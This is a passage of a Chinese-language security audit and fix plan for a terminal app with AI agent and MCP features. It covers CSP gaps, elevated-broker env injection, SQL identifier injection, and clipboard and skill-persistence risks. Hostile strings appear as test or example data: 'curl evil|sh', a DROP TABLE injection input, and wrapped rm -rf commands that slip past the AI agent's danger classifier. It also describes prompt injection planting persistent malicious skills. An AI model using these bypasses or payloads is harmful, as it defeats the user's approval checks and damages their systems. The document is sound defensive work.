1. **首选**：删除该调试日志（`F-029` 的清洗逻辑已有测试 `frontend/src/components/sanitize.test.ts`，不需要生产日志）。
2. 若必须保留排障能力：只用 `import.meta.env.DEV` 或一个持久化的 debug 开关控制；内容只打印长度/字符类别/哈希（`text.length`、`cleaned !== text`、非法字符码点集合），绝不打印原文。
3. 在 `FrontendLog`（`app.go:2891`）里对 `\r`/`\n` 做转义（`strconv.Quote` 风格）以防伪造日志行；如需保留多行，给后续行加前缀。
4. 顺带梳理其它 `FrontendLog` 调用点（`grep -rn "FrontendLog" frontend/src`），确认没有同类内容外泄。

**涉及文件**
- `frontend/src/components/BaseTerminal.vue`
- `app.go`（`FrontendLog` 转义）
- 测试：`frontend/src/components/sanitize.test.ts`（现有）、新增断言"不调用 FrontendLog/不打印内容"（可 mock 模块）

**验收标准**：终端内容不再出现在应用日志中；`FrontendLog` 无法通过换行伪造日志行。

**回归风险**：极低。注意保留终端回放本身的清洗行为。

---

### F-09（中）无 CSP、未拦截 webview 导航

**状态**：已修复
**位置**
- `frontend/index.html`（无 CSP meta；只有一段内联主题脚本 `:8-38`）
- `main.go:388+`（`application.New` 选项与窗口事件；无导航/webview 限制）
- 参考（第三方）：Wails v3 beta.27 在每次 `NavigationCompleted` 注入 runtime（`webview_window_windows.go:2767` 附近），且 `handleWindowMessage` 对 `wails:` 消息不做 origin 校验（`application.go:860` 附近）

**证据/分析**
- 应用会渲染不可信文本（AI 消息、更新日志、终端）。虽然 `sanitizeRenderedHtml`（`frontend/src/utils/markdown.ts`）做了转义与危险标签/属性剥离，但它是**正则清洗**，作为唯一防线偏薄。没有 CSP 时，任何一次绕过都直接执行任意脚本。
- Wails 的绑定调用走 `wails:` 消息，宿主不校验消息来自哪个 origin。若 webview 被导航到远程页面（例如用户点击 AI 消息里的 `target="_blank"` 链接，且 WebView2 未注册 `NewWindowRequested` 时的默认行为允许在视图内打开），该页面会拿到注入的 runtime 与全部 `App` 绑定 → 等同 RCE。
- 另外 `LoadAIModels` / `LoadSettings` 会把解密后的 API Key 交给 renderer（因为 `ChatCompletion(apiKey, ...)` 由前端传 key），所以 XSS = key 泄露。

**修复方向（建议，按收益排序）**
1. **把 API Key 留在 Go 侧**：`ChatCompletion(modelId, requestJSON, ...)` 由 Go 自行从 `aiConfigStore` 取 key（或使用短生命周期的一次性 token），前端不再持有明文 key。这是收益最大的一步，改动面中等（涉及 `llm.ts` 调用点、`FetchModels`、sync 兼容）。
2. **加 CSP**：`default-src 'self'; script-src 'self' 'sha256-<inline-theme-script-hash>'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self'`。可通过 Wails 的 asset handler 设置响应头，或 `<meta http-equiv="Content-Security-Policy">`（注意 Wails 注入的 runtime 是内联脚本，需要放行/hash，实测确认）。
3. **拦截导航**：在 `main.go` 注册导航/新窗口处理（Wails v3 beta.27 支持 `window.OnWindowEvent`/webview 级回调；若没有直接 API，则在渲染层做全局捕获：`document.addEventListener('click', …)` 拦截所有 `<a>`，非应用 origin 一律 `preventDefault()` + `Browser.OpenURL(href)`）；对 `window.open` 做覆盖。
4. **AIMessage 的 sanitizer** 作为纵深防御保留；长期建议换成真正的 HTML sanitizer（如 DOMPurify）或改为"先转 AST 再渲染"（当前正则实现有嵌套/自闭合边界情况，不建议继续叠加正则）。

**涉及文件**
- `app_ai.go`（`ChatCompletion`/`FetchModels` 签名与取 key 逻辑）、`frontend/src/services/llm.ts`、`frontend/src/stores/aiConfigStore.ts`
- `frontend/index.html`、`main.go`、`frontend/src/App.vue` 或 `frontend/src/utils/`
- `frontend/src/utils/markdown.ts`（如换库）

**测试要求**
- CSP：Wails 打包后手测 dev 与 production 构建均无 CSP 报错（动态 `import('@novnc/novnc')`、`spice-html5` 的 `new Function`？先 grep 确认；若有需要，`script-src` 加 `'unsafe-eval'` 并记录原因）。
- 导航拦截：vitest 模拟点击 `<a href="https://evil">`，断言调用 `Browser.OpenURL` 且未改变 `location`。
- Key 不再下发：断言 `LoadAIModels` 返回值中 API key 为掩码/空（需要同步修改前端读取逻辑与 sync 明文导出逻辑，注意 `store.SecretFiles` 中 `ai.json` 的 `models.*.apiKey` 仍要加密）。

**验收标准**：renderer 不再持有明文 API key；CSP 生效；点击外部链接不会在应用 webview 内导航。

**回归风险**：这是本清单中改动面最大的一项。建议拆成 3 个独立提交（key 收敛 / CSP / 导航拦截）。注意不要破坏 `Browser.OpenURL` 的现有行为、`@novnc/novnc` 动态导入、SPICE 的 vendor 脚本加载。

---

### F-10（中低）管理员 shell broker 未校验 Env / WorkDir

**状态**：已修复
**位置**：`backend/session/local_admin_broker_windows.go:336-357`（`serveLocalPtyBroker`）

**证据**

```go
env := os.Environ()
if len(spec.Env) > 0 {
    env = append(env, spec.Env...)      // ← 任意键值
}
cpty, err := conpty.Start(spec.CommandLine,
    conpty.ConPtyDimensions(cols, rows),
    conpty.ConPtyWorkDir(spec.WorkDir), // ← 任意路径
    conpty.ConPtyEnv(env))
```

同文件已对 `CommandLine` 做了四重校验（`elevatedSpawnRefusal`: 允许的 shell 名单、`underElevatedTrustedRoot` 规范路径、`elevatedArgsAllowed` 参数形状、clink 路径 pin），注释明确威胁模型是"任何能触达 spawn 帧的同用户代码"。但 `Env` 与 `WorkDir` 未纳入同一威胁模型。

**影响（防御纵深）**
- `WorkDir` = 攻击者可控目录/UNC → 提权进程以该目录为 cwd，存在 DLL 侧加载与相对路径劫持面。
- `Env` 注入 `BASH_ENV`/`ENV`（POSIX sh 非登录交互会读 `$ENV`）、`PSModulePath`（PowerShell 模块自动加载）、`GIT_*`、`WSLENV` 等 → 把"只能启动固定 shell"退化为任意提权代码执行。
- 实际可达性低：管道有 `FILE_FLAG_FIRST_PIPE_INSTANCE`、当前用户 DACL、64 位随机名（`startElevatedPty`），且 broker 是客户端、由 app 主动写 spawn 帧。

**修复方向**
1. `WorkDir`：要求非空时必须是绝对路径、`filepath.Clean` 后不含 `..`、且位于允许根（用户主目录 / 已授权目录）内；拒绝 UNC 与设备路径（`\\.\`、`\\?\`）。可复用 `utils.SafeLocalJoin` 思路。
2. `Env`：改为**键白名单**（当前调用方只传 `WT_SESSION`，见 `localPtySpawn` 注释），例如只允许 `WT_SESSION`、`TERM`、`COLORTERM`、`LANG`/`LC_*`；其它键直接丢弃（或整帧拒绝）。更严格：在 app 侧就不要把任意 env 传给 broker。
3. 顺带把 `Cols/Rows` 的上限做 clamp（现在只处理 `<=0`，极大值可能让 ConPTY 分配异常内存）。

**涉及文件**
- `backend/session/local_admin_broker_windows.go`
- `backend/session/local_admin_windows.go`（spawn 帧构造侧）
- `backend/session/local_session_windows.go`（clink/WSL 的 env 来源）
- 测试：`backend/session/local_admin_test.go`（已有用例，追加拒绝用例）

**测试要求**：`env` 含 `BASH_ENV`/`PSModulePath` → 被丢弃；`WorkDir = C:\Windows\System32\..\evil`、UNC、`\\?\` → 拒绝；正常 `WT_SESSION` 仍透传。

**验收标准**：上述用例通过，且现有 `TestBuildCommandLineQuoteBreakout` 等不回归。

**回归风险**：不要影响 clink（`WT_SESSION=0`）与 WSL（`--cd ~`）的正常路径；broker 逻辑只在 Windows 编译。

---

### F-11（中低）SQL 标识符拼接

**状态**：已修复
**位置**
- `backend/database/provider_oracle.go:405-425`（`buildColumnSQL`），调用方 `:345-367`
- `backend/database/provider_mysql.go:484-520`（`buildColumnSQL`），`col.Type` 在 `:486`，`COLLATE` 在 `:513`
- 对照（正确做法）：`provider_postgres.go:65-76`（`pgQuoteIdent` 双写引号）、`provider_sqlserver.go:62-64`（`]]`）、`provider_mysql.go:55-57`（反引号双写）

**证据**

```go
// provider_oracle.go:405
func (p *oracleProvider) buildColumnSQL(action, tableName string, col ColumnDef) string {
    if !strings.Contains(tableName, `"`) {
        tableName = p.Quote(tableName)   // 含 " 就完全跳过转义
    }
```

```go
// provider_mysql.go:486 / 513
parts = append(parts, q(col.Name), col.Type)          // 原样拼接
parts = append(parts, "COLLATE "+col.Collation)       // 原样拼接
```

**根因**：Oracle 的 `qualifiedTable()` 已经产出带引号的名字，为了避免二次引用加了"含 `"` 就跳过"的特判，但这个条件对用户输入同样成立；MySQL 的列类型/排序规则在 UI 中是自由文本。

**影响**：DDL 语句（`ALTER TABLE`）的标识符注入。MySQL 驱动默认关闭多语句，因此难以直接堆叠执行，但可注入表达式/注释/额外列定义；Oracle 可构造 `ALTER TABLE <name>" ...` 之类。属于"本地用户/AI 可调用的绑定输入"，风险不及远程面，但与仓库其它地方的严格引用风格不一致，应统一。

**修复方向**
1. 删除 Oracle 的条件跳过：始终对 `tableName`/`dbName` 使用 `p.Quote`，需要 schema 限定就由调用方传 `(dbName, tableName)` 分别引用，不要传已拼接的字符串（需要同时调整 `AddColumn`/`ModifyColumn` 的调用）。
2. MySQL：`col.Type` 走白名单校验（`^[A-Za-z][A-Za-z0-9_ (),\']*$` 或维护类型列表）；`col.Collation` 用 `^[A-Za-z0-9_]+$` 校验后引用。
3. 对 `ColumnDef.Name`、`IndexDef.Columns`、`DefaultVal` 统一走现有 `SafeMyIdent`/`SafePgIdent`（先确认各 provider 的 `Safe*` 语义，避免过度拒绝合法名字）。
4. 加一条"所有 DDL builder 都必须经过 Quote/Safe*"的测试约定（可用表驱动对每个 builder 输入含 `"`、`` ` ``、`]`、`;`、`--` 的名字，断言输出被正确转义）。

**涉及文件**：`backend/database/provider_oracle.go`、`provider_mysql.go`、`provider_sqlserver.go`、`provider_sqlite.go`、`provider_postgres.go` 对应测试。

**测试要求**：`go test ./backend/database`；新增转义用例（含 `"; DROP TABLE x; --`、`a"b`、``a`b``、`a]b`）。

**验收标准**：含引号的标识符不再破坏语句结构；正常 DDL 行为不变。

**回归风险**：注意 `oracle buildColumnSQL` 的特判可能是为某些调用方（传入 `SCHEMA.TABLE` 已引用串）保留的，改之前 `grep -rn "buildColumnSQL"` 确认所有调用点（当前只有 `AddColumn`/`ModifyColumn`），并同步 `commentOnColumnSQL`、`DropColumn`。

---

### F-12（低）工程与流程类问题

**状态**：已修复

| 子项 | 位置 | 问题 | 修复方向 |
|---|---|---|---|
| F-12.1 | `app_mcp.go:846-860` | `mcp-audit.log` 只 append，无轮转/大小上限 | 复用 `backend/log` 的 `rotateLocked` 思路，或加 `maxAuditBytes` + `.1` 轮转 |
| F-12.2 | `app.go:2985`（`SetDataDir`）、`app.go:3405`（copyDir） | 数据目录 `0755`，同机其他用户可遍历/列文件名（文件本身 0600） | 统一 `0700`（日志目录已经是 0700，`backend/log/log.go:initLocked`），迁移时 Chmod 旧目录 |
| F-12.3 | `backend/store/skills_store.go:437-439` | `strings.HasPrefix(clean, "..")` 误杀合法文件名（`..notes.md`），且不解析符号链接 | 改用 `utils.SafeLocalJoin(root, rel)` + 后缀白名单 |
| F-12.4 | `backend/database/engine.go:54-56` | `queryStrings` 用 `db.Query` 无 context/超时，慢库可长期占用 goroutine | 改为 `QueryContext` + `queryTimeout` |
| F-12.5 | `frontend/src/services/terminalManager.ts:376-397` | OSC 52 **写入**剪贴板无任何提示/开关（远端可静默把 `curl evil\|sh` 放进剪贴板诱导粘贴） | 加设置项（允许/询问/禁止），默认"询问"或"禁止"；读取已正确返回空 |
| F-12.6 | `frontend/src/services/agent.ts:1428`、`stores/skillStore.ts:118-136` | `save_skill` 新建技能**不弹确认**（覆盖未锁定技能才弹），prompt injection 可持久化恶意技能并在后续会话注入系统提示 | 新建也弹确认；或限制 agent 只能覆盖非锁定且已在"允许自动写入"白名单内的技能 |
| F-12.7 | `backend/mcp/server.go:187-194` vs `tools.go:314` | `Policy` 注释写 "bypass: no dialogs (dangerous commands still require approval)"，实现是连 dangerous 全免 | 修正注释或实现，二者取一；建议保留实现并改注释（UI 已有"全部免确认"语义） |
| F-12.8 | `go.mod:122-126` | `golang.org/x/crypto`、`simples3`、`mosh-go` 被替换为个人 fork（`github.com/ys-ll/*`）。**fork 导致 govulncheck 无法按上游模块名匹配 advisory**（本次扫描中 `x/crypto` 完全没出现），需人工跟踪上游 CVE | 在 `docs/dev/` 记录 fork 基线与上游版本（`x/crypto v0.57.1` + patch），每次升级同步跟随；CI 里额外对上游版本做一次 `osv-scanner` 类比对（或写成脚本） |
| F-12.9 | `.github/` | 无 dependabot、无 `govulncheck`/`npm audit`/`gosec` 步骤；无 `SECURITY.md` 披露渠道 | 加 `.github/dependabot.yml`、`.github/workflows/security.yml`（`govulncheck` + `npm audit --omit=dev` + `gosec`，允许 non-blocking 起步）、`SECURITY.md`（双语，含联系邮箱与支持版本） |
| F-12.10 | `app.go`（3445 行）、`backend/session/monitor_session.go`（2824 行）、包级全局 `fileGrants`/`knownHosts` | 巨型文件/全局可变状态，审计与并发成本高 | 不要求本次重构；新增代码时按域拆分（`app_*.go` 已有先例），全局状态新增强制走注释说明生命周期 |
| F-12.11 | `backend/mcp/tools_job.go:453-460`、`backend/mcp/tools.go:264-287` | 只读 MCP 工具（`uniterm_capture`、`get_command_output`）在默认策略下免确认即可读取终端屏幕/命令输出，而屏幕可能含密码 | 文档/UI 说明该取舍；或给 `capture` 单独的策略开关（见 F-06） |

---

## 3. 已确认的"非问题"（避免修复模型误改）

| 项 | 说明 |
|---|---|
| `@vue/server-renderer` XSS 告警 | 纯客户端 SPA，无 SSR 路径，不可利用；升级只为清噪 |
| `source-map-js` 告警 | 仅构建期依赖，不随应用分发 |
| `golang.org/x/net` HTTP/2 告警 | MCP 服务是明文 HTTP/1.1 127.0.0.1，未直接用 http2；随版本升级处理即可 |
| `webp` 告警的实际爆炸半径 | 代码只调用 `image.DecodeConfig`（非 `Decode`），现实可利用性低；升级仍必要 |
| 更新包链路 | Ed25519 签名 + SHA256 + host allowlist + 重哈希 + `production` tag，已充分加固，**不要改** |
| SSH host key | TOFU fail-closed，已正确；**不要**为了"方便"改成 accept-all |
| `file_grants.go` / `utils.SafeLocalJoin` | 设计正确，新代码应复用而不是另写一套 |
| `x11_desktop_session.go` 里的 `sh -c` 字符串 | 是固定常量脚本（`dbus-run-session -- sh -c '...'`），无用户输入拼接，不是注入点 |
| `container/commands.go` 的 `sh -c` | 脚本由调用方 `posixQuote` 拼接；`detectArgs` 只用 `rt.Bin()` 常量，不是注入点 |
| `monitor_session.go` 的 `systemctl` 拼接 | 已有 `validUnitName`（首字符必须字母数字，防选项注入）与 `validServiceAction` 白名单，**保持** |
| `scp_session.go` 的 `shellEscape` | 单引号转义实现正确，**保持** |

---

## 4. 修复顺序建议（含依赖）

```
第 1 批（低风险、立刻可做）
  F-01  Zip Slip
  F-05  依赖升级（x/image、x/net、js-yaml）
  F-08  删除终端内容调试日志
  F-12.3 / F-12.4 / F-12.7  （小修）

第 2 批（安全边界，需两端同步 + 测试）
  F-02  分类器收紧 + AI 默认改 confirm_write + 可持久化
  F-03  外部 MCP 工具纳入确认
  F-06  MCP 服务加固（超时/Origin/Scope/审计轮转）

第 3 批（结构性，改动面大）
  F-09  API Key 收敛到 Go + CSP + 导航拦截（拆 3 个提交）
  F-04  本地面板授权模型重构
  F-07  AI baseURL 强制 HTTPS + 响应体上限
  F-10  broker Env/WorkDir 白名单
  F-11  SQL 标识符统一引用

第 4 批（流程）
  F-12.8 / F-12.9  供应链跟踪 + CI 扫描 + SECURITY.md
  F-12.1 / F-12.2 / F-12.5 / F-12.6 / F-12.11
```

**依赖说明**
- F-09 的 key 收敛会改变 `ChatCompletion`/`FetchModels` 签名，与 F-07 的 URL 校验在同一组文件，建议同一分支先后完成。
- F-02 与 F-03 都改 `agent.ts`，但逻辑独立，可并行；F-02 的 fixture 可被 F-03 的确认流程复用。
- F-06 的 scope 与 F-03 无直接关系（前者是 uniTerm 作为 server，后者是作为 client）。

---

## 5. 附录 A：分类器绕过复现（可直接作为测试用例）

**复现方式**：把 `backend/mcp/risk.go` 复制到独立模块（补一个 `RiskClass` 定义），调用未导出的 `classifyCommand`。或修复后直接写进 `backend/mcp/risk_test.go`。

```go
cases := []struct{ cmd string; want RiskClass }{
    {"rm -rf /tmp/x",               RiskDangerous},
    {"sudo -n rm -rf /tmp/x",       RiskDangerous},
    {"sh -c 'rm -rf /tmp/x'",       RiskDangerous},

    // 当前实测为 RiskWrite —— 修复后应为 RiskDangerous
    {"nice -n 5 rm -rf /tmp/x",     RiskDangerous},
    {"time -p rm -rf /tmp/x",       RiskDangerous},
    {"env -S 'rm -rf /tmp/x'",      RiskDangerous},
    {"python3 -c 'import shutil;shutil.rmtree(\"/tmp/x\")'", RiskDangerous},
    {"node -e 'require(\"fs\").rmSync(\"/tmp/x\",{recursive:true})'", RiskDangerous},
    {"perl -e 'system(\"rm -rf /tmp/x\")'", RiskDangerous},

    // 当前实测为 RiskRead —— 修复后应至少 RiskWrite（或 Dangerous）
    {"sort -o /tmp/out /etc/hosts", RiskWrite},
    {"git log --output=/tmp/out",   RiskWrite},
    {"find /tmp -fprint /tmp/out",  RiskWrite},
    {"date -s 20200101",            RiskWrite},

    // 保持：读命令仍是 Read
    {"ls -la",                      RiskRead},
    {"git status",                  RiskRead},
    {"cat /etc/hostname",           RiskRead},
}
```

> 两端（Go/TS）都要有这份用例，并在 `frontend/src/services/agent.risk.test.ts` 中断言 `getRisk()` 结果。

---

## 6. 附录 B：本次扫描原始结论

- `go vet ./...` → exit 0，无输出。
- `govulncheck ./...` → 1 个 Symbol 级（`x/image` webp，经 `webp.init` 注册可达）+ 2 个 Package 级（`x/image`）+ `x/net` 5 个 Module 级；无 stdlib 可达告警。
- `npm audit --omit=dev` → 4 条（1 moderate / 3 high），其中 2 条为不可利用/构建期（见 §3）。
- `go test -race` 无法执行：`-race requires cgo`（当前 Windows 环境 `CGO_ENABLED` 不可用）。

---

## 7. 状态跟踪表（修复后更新）

| ID | 负责人 | 分支/PR | 状态 | 备注 |
|---|---|---|---|---|
| F-01 | pi | sec/high-fixes | 已修复 | `b42ec4ec` Zip Slip：SafeLocalJoin + symlink 拒绝 + root 校验 |
| F-02 | pi | sec/high-fixes | 已修复 | `1a754674` 分类器 v2（wrapper 选项表/解释器一律 dangerous/只读写选项）+ 跨语言共享 fixture + AI 默认 confirm_write 持久化 |
| F-03 | pi | sec/high-fixes | 已修复 | `2718f8af` 外部 MCP 工具纳入确认（trusted 标记 + 确认面板 + 拒绝续跑） |
| F-04 | pi | sec/high-fixes | 已修复 | `9d434e8f` 本地面板授权改为显式目录 grant + symlink 复核 + 根目录拒绝 + UI 选择目录按钮 |
| F-05 | pi | sec/high-fixes | 已修复 | `9cd7d31b` x/image、x/net、js-yaml 等升级；YAML 解析加 2MB 上限 |
| F-06 | pi | sec/high-fixes | 已修复 | `559392bf` 超时/Origin/Host/body 上限/scope 实现/撤销立即生效/审批限速；审计轮转同时关闭 F-12.1 |
| F-07 | pi | sec/high-fixes | 已修复 | `04dcf12a` baseURL 强制 https/loopback + 显式"允许不安全 HTTP"开关；FetchModels 4MB 上限 |
| F-08 | pi | sec/high-fixes | 已修复 | `f0831500` 删除终端原文日志 + FrontendLog 控制字符转义 |
| F-09 | pi | sec/high-fixes | 已修复 | `249cdace + db71d652 + e05e4912` key 收敛 / CSP / 导航拦截（3 个提交） |
| F-10 | pi | sec/high-fixes | 已修复 | `59e545bf` broker Env 白名单 + WorkDir 校验 + 尺寸 clamp |
| F-11 | pi | sec/high-fixes | 已修复 | `e592cb1d` Oracle 表名始终 Quote + 各 provider 列类型/排序规则白名单 |
| F-12.1 | pi | sec/high-fixes | 已修复 | `559392bf` 随 F-06：mcp-audit.log 8MB 轮转（保留 .1） |
| F-12.2 | pi | sec/high-fixes | 已修复 | `7370f6ae` 数据目录 0700 + 启动时收紧旧目录 |
| F-12.3 | pi | sec/high-fixes | 已修复 | `5426de7f` IsLocal + SafeLocalJoin，不再误杀 "..notes.md" |
| F-12.4 | pi | sec/high-fixes | 已修复 | `e774f53f` queryStrings/queryAny 走 QueryContext + queryTimeout |
| F-12.5 | pi | sec/high-fixes | 已修复 | `d34f2747` OSC 52 写剪贴板 ask（默认）/allow/deny 设置 + i18n |
| F-12.6 | pi | sec/high-fixes | 已修复 | `7e68f95b` save_skill 新建技能同样弹确认 |
| F-12.7 | pi | sec/high-fixes | 已修复 | `525558ef` 按建议修正 bypass 注释（保留实现） |
| F-12.8 | pi | sec/high-fixes | 已修复 | `a3d46464` docs/dev/go-fork-baselines.md + scripts/check-fork-advisories.py |
| F-12.9 | pi | sec/high-fixes | 已修复 | `c0405480` dependabot.yml + security.yml（non-blocking 起步）+ SECURITY.md |
| F-12.10 | pi | sec/high-fixes | 有意不修 | `—` 有意不修：文档明确"不要求本次重构"；新增代码按域拆分约定照旧 |
| F-12.11 | pi | sec/high-fixes | 已修复 | `c0405480` SECURITY.md"已知取舍"记录只读 MCP 工具的屏幕/输出取舍与缓解手段 |
